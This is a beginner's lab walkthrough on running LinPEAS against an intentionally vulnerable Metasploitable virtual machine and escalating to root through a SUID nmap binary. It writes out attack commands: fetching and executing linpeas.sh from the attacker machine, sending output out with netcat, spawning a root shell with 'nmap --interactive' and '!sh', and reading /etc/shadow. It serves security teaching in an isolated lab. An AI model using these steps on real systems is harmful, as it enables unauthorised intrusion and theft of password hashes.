# CSA LinPEAS & Linux Privilege Escalation Walkthrough

#### By Reagan Larsen

We are going to assume you already have a basic knowledge of the Linux command prompt (don't overthink this; if you've ever used it before, you're golden) and Virtual Machines. Otherwise, this is written for beginners. For the sake of this demo, I will be using VMWare Workstation as my hypervisor to host the virtual machines (VMs), but another VM platform is Oracle VirtualBox. 
For the demonstration, I will be using my Kali machine as my personal computer, and our victim will be a Metasploitable machine, which is an intentionally vulnerable Linux computer that we can use to practice our hacking skills. Links to download these are here:
1. **Hypervisors**
	1. https://www.virtualbox.org/
	2. https://www.vmware.com/products/desktop-hypervisor/workstation-and-fusion
2. **Virtual Machines**
	1. https://www.kali.org/
	2. https://sourceforge.net/projects/metasploitable/
Choose your hypervisor, and ensure both Kali and the Metasploitable Virtual Machines are downloaded and opened on your hypervisor. 

# Initial Setup
## Setup Low-privilege User
TECHNICALLY Metasploitable is supposed to be broken into, and from here you can use LinPEAS and all your favorite tools. But for the sake of this demo, we are going to create our own user: Bob.
Anything that looks like `this text` is (usually) a command to put in the terminal or a menu item to be selected.

### On Metasploitable
1. Login as msfadmin
	1. Username: `msfadmin`
	2. Password: `msfadmin`
		1. *Note: Passwords will be hidden*
2. Create Bob
	1. `sudo useradd bob`
		1. You will likely need to type in the msfadmin password again here.
	2. `sudo passwd bob`
	3. Choose a password. Don't get crazy; I just used "bob" as the password.
		1. Password: `bob`
		2. Confirm password: `bob`
3. `logout`
4. Login as bob.
	1. login: `bob`
	2. Password: `bob`

![[./images/Pasted image 20260209145322.png]]

## Get LinPEAS on Kali
LinPEAS is a tool that needs to be downloaded. On your internet-connected Kali machine, do the following.
*Note: The default credentials for Kali are Username: `kali` Password: `kali`*

### On Kali Linux
1. Open a terminal (the black icon with $_ in the corner)
2. `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh`

![[./images/./images/Pasted image 20260209145931.png]]

## Connect the VMs
Now we need to virtually place Kali and Metasploitable on the same network. Think of it like two devices connected to the same Wi-Fi. The instructions I'll give to do this will be fairly similar regardless of which hypervisor you're using, but will not be 1:1.

### On VMware, do this for BOTH virtual machines, meaning you'll have to do this twice
1. In the top-left corner, select `VM`
2. In the dropdown, select `Settings`
3. In the new window, navigate to `Network Adapter` in the list on the left.
4. From that menu, select your Network Connection as `Custom`
5. Specify the network as `VMnet1 (Host-only)`
	1. Host-only means Kali can talk to Metasploitable, but Metasploitable is isolated from the internet.
6. Click `Okay`

![[./images/Pasted image 20260209150557.png]]
![[./images/Pasted image 20260209150206.png]]

7. Once this is done. POWER OFF BOTH VMS. Then turn them back on again. This will allow the networking changes to take place and make our lives easier.

### On Metasploitable
1. `ip a`
	1. This will display your IP ADDRESS. In my case (as it will likely be different for you), the IP address is *192.168.9.129*. Save this information for later.
![[./images/Pasted image 20260209151750.png]]

### On Kali
1. `ip a`
	1. Ensure your IP address is different from your Metasploitable address (they will likely be very similar). Remember this. My IP address is *192.168.30.128*
2. `ping <metasploitable_ip_address>`
	1. You should see some feedback, ensuring the machines can connect to each other.
![[./images/Pasted image 20260209151628.png]]

---
---
# The Scenario

Why are we having you use both Kali and Metasploitable? The story here is that you are a Penetration Tester hired by Metasploitable Inc. You are equipped with your trusty Kali Linux computer where you conduct all of your pentesting. M. Inc wants you to see if you are able to perform privilege escalation in any of its many varieties, as their employees should not have administrative (root) access. As proof, they want you to show their `/etc/shadow` file with all their user's encrypted passwords.

During your test, you have gained access to a M. Inc computer, which you can view through your hypervisor as the Metasploitable virtual machine. Also during your test, you have extracted credentials for the user Bob. You have used Bob's credentials to log into the computer remotely.

While there are many methods to use LinPEAS on the M. Inc computer that each have their pros and cons, we'll simulate a viable method here. If you are interested in learning more, there are extra resources linked at the bottom of this exercise.

# The Attack

The `linpeas.sh` script is a file. When you run it, it will run on the computer it is currently on. But we want to use the LinPEAS tool on M. Inc's computer as if we were Bob. We can't just download LinPEAS to this machine, as that is suspicious activity. So we'll have to upload LinPEAS from our Kali machine to Metasploitable.

### On Kali
1. `cd /usr/share/peass/linpeas`
	1. (An alternate way I've found that sometimes takes you to this directory automatically is to type `linpeas.sh --version`)
2. `python3 -m http.server 8000`
	1. This will start a server that the Metasploitable computer can connect to and share files.
![[./images/Pasted image 20260209153329.png]]
### On Metasploitable
1. `cat /etc/shadow`
	1. Right now, Bob cannot view the */etc/shadow* file with all the stored passwords. This needs root access. So let's ignore this for now.
![[./images/Pasted image 20260209165007.png]] 
2. `cd /tmp`
	1. Bob also cannot write files to his own home directory. But he CAN write files to the temporary directory, *tmp*, which is perfect for us right now.
3. `wget http://<kali_ip>:8000/linpeas.sh`
4. `chmod +x linpeas.sh`
	1. This makes it so the script is actually executable.
5. `./linpeas.sh > linpeas.out`
	1. Execute.

![[./images/Pasted image 20260209155055.png]]

From here, LinPEAS will do its thing, testing all sorts of attack vectors to see if there are any opportunities for us to do some privilege escalation with Bob's account. This may take some time. Just let it run.
*Note: For the screenshot, you can see me using `linpeas_small.sh`. Here, I was experimenting with a version of linpeas designed to run on older shells, like what Metasploitable uses. However, this is unnecessary. If you use linpeas_small, you will not get a full-size report.*

## Get the report back to Kali
Oftentimes you'll just be able to view *linpeas.out* just by using a command like `less linpeas.out`. But Metasploitable gives us grief, so like a good pentester, we're going to send this file back to our Kali machine to view at our leisure.

### On Kali
If your python server is still running, use Ctrl + c to stop it.
1. `mkdir ~/Documents/CSA`
2. `cd ~/Documents/CSA`
	1. This moves us to a new folder where we'll save the LinPEAS report.
3. `nc -lvnp 9001 > linpeas.out`
	1. This tells Kali to look for the linpeas.out file floating around on the network on port 9001.
![[./images/Pasted image 20260209155859.png]]
### On Metasploitable
1. `nc <kali_ip> 9001 < linpeas.out`
	1. It may stall here. Just give it about a minute or two. If it doesn't close out on it's own, just Ctrl+c to stop it.

### On Kali
1. `ls`
	1. This just lists which files you have in your current directory. You should see *linpeas.out*.
![[./images/Pasted image 20260209160155.png]]
2. `less -R linpeas.out`

This last command will open the report. Press `q` to quit at any time. Please skim through this and take a look! Read the legend at the beginning to understand how to interpret this data, and see if you can find anything interesting and exploitable. Have fun!

# Privilege Escalation
## Escape Nmap
LinPEAS found: `-rwsr-xr-x 1 root root ... /usr/bin/nmap`.

![[./images/Pasted image 20260209163002.png]]

There is an ever-growing online resource called **GTFObins**. In their own words:

> GTFOBins is a curated list of Unix-like executables that can be used to bypass local security restrictions in misconfigured systems.
> The project collects legitimate functions of Unix-like executables that can be abused to . . . break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate other post-exploitation tasks.

LinPEAS will often search for the file binaries listed in GTFObins, and when there's a match, it highlights it, as seen above. Metasploitable uses an older version of nmap, so let's check to see what we can find about nmap at https://gtfobins.org/.

![[./images/Pasted image 20260210171358.png]]

GTFObins is giving us instructions for how an unprivileged user can spawn a root shell, which explains why LinPEAS said there's a 95% chance we could abuse this version of nmap for privilege escalation. Let's try this for ourselves.

### From Metasploitable
1. `nmap --interactive`
2. `!sh`

This gives us a root shell where we can do whatever we want! To show the change, I used the command `whoami` to ask Metasploitable which account I am. The first time, it was my *demo* account (for you it will be *bob*). Then, after the exploit, whoami returned 
![[./images/Pasted image 20260209164107.png]]

3. `cat /etc/shadow`
	1. Now we can send this screenshot to M. Inc as proof of our privilege escalation!

![[./images/Pasted image 20260209165418.png]]

**Hacker voice: *I'm in.***

# Resources
- Privilege Escalation Awesome Scripts Suite GitHub: https://github.com/peass-ng/PEASS-ng/tree/master
	- LinPEAS: https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
- TryHackMe Linux PrivEsc Room (free): https://tryhackme.com/room/linprivesc
- Hack the Box Linux PrivEsc Module (paid): https://academy.hackthebox.com/beta/module/51
- GTFObins: https://gtfobins.org/